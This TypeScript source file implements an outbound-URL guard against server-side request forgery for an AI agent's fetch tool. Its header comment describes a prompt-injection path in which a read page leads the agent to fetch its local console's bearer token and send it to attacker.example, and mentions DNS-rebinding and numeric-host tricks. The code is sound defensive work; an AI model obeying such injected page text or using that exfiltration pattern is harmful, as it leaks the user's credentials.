/**
 * Outbound-URL guard for tools that fetch what the model asks for.
 *
 * WHY. `web.fetch_url` is read-only, so it runs without approval, and it only
 * checked the scheme. A page Flint read could tell it to fetch
 * http://127.0.0.1:8080/ — Flint's own console, which carries its bearer token —
 * and then fetch https://attacker.example/?t=<token>: two approval-free steps.
 * deep_research already refused private hosts by name; this is that check, made
 * shared, plus two things it lacked: a DNS lookup before connecting (a public-
 * looking name can resolve to 127.0.0.1) and a check on EVERY redirect hop
 * rather than only the last one (by then the private request was already made).
 *
 * Residual risk, accepted: the lookup and the connection resolve separately, so a
 * name that re-points between them (DNS rebinding with a zero TTL) can still
 * slip through. Pinning the connection to the checked address would close it.
 */
import { lookup } from 'node:dns/promises';
import { isIP } from 'node:net';

/** A URL the guard will not fetch, and why. */
export class UrlRefused extends Error {
  constructor(reason: string) {
    super(reason);
    this.name = 'UrlRefused';
  }
}

/**
 * Loopback, private, link-local, CGNAT/Tailscale, multicast/reserved, and the
 * local-only names (.local, .localhost, .internal, .ts.net, bare intranet names).
 * Takes a hostname or an IP literal, with or without IPv6 brackets.
 */
export function isPrivateHost(host: string): boolean {
  const h = host.toLowerCase().replace(/^\[|\]$/g, '');
  if (h === 'localhost' || h.endsWith('.localhost') || h.endsWith('.local') || h.endsWith('.internal') || h.endsWith('.ts.net')) return true;
  if (!h.includes('.') && !h.includes(':')) return true; // bare intranet names
  if (h.includes(':')) return h === '::1' || h === '::' || /^(fc|fd|fe80)/.test(h) || h.startsWith('::ffff:');
  const m = h.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
  if (!m) return false;
  const [a, b] = [Number(m[1]), Number(m[2])];
  return (
    a === 0 || a === 10 || a === 127 || (a === 169 && b === 254) || (a === 172 && b >= 16 && b <= 31) ||
    (a === 192 && b === 168) || (a === 100 && b >= 64 && b <= 127) || a >= 224
  );
}

export type Resolve = (host: string) => Promise<string[]>;

const resolveAll: Resolve = async (host) => (await lookup(host, { all: true, verbatim: true })).map((r) => r.address);

/**
 * The URL, parsed, if it is http(s) to a public host whose every DNS address is
 * public; otherwise throws UrlRefused. WHATWG URL parsing normalises numeric
 * hosts first (`http://2130706433/` and `http://0x7f.1/` both become 127.0.0.1).
 */
export async function assertPublicUrl(raw: string | URL, resolve: Resolve = resolveAll): Promise<URL> {
  let u: URL;
  try {
    u = typeof raw === 'string' ? new URL(raw) : raw;
  } catch {
    throw new UrlRefused('not a valid URL');
  }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') throw new UrlRefused('only http(s) URLs are fetched');
  const host = u.hostname;
  if (isPrivateHost(host)) throw new UrlRefused(`${host} is a private or local address`);
  if (isIP(host.replace(/^\[|\]$/g, '')) === 0) {
    let addrs: string[];
    try {
      addrs = await resolve(host);
    } catch {
      throw new UrlRefused(`${host} did not resolve`);
    }
    if (addrs.length === 0) throw new UrlRefused(`${host} did not resolve`);
    const bad = addrs.find((a) => isPrivateHost(a));
    if (bad) throw new UrlRefused(`${host} resolves to a private or local address`);
  }
  return u;
}

export interface GuardedFetchOptions {
  maxRedirects?: number;
  resolve?: Resolve;
  /** Injected in tests. */
  fetchImpl?: typeof fetch;
}

/**
 * fetch(), with redirects followed by hand so every hop passes assertPublicUrl
 * BEFORE it is requested. The final response is returned as-is (any status).
 */
export async function guardedFetch(url: string, init: RequestInit = {}, opts: GuardedFetchOptions = {}): Promise<Response> {
  const fetchImpl = opts.fetchImpl ?? fetch;
  const max = opts.maxRedirects ?? 5;
  let current = await assertPublicUrl(url, opts.resolve);
  for (let hop = 0; ; hop++) {
    const res = await fetchImpl(current, { ...init, redirect: 'manual' });
    const location = res.status >= 300 && res.status < 400 ? res.headers.get('location') : null;
    if (!location) return res;
    if (hop >= max) throw new UrlRefused(`more than ${max} redirects`);
    current = await assertPublicUrl(new URL(location, current), opts.resolve);
  }
}
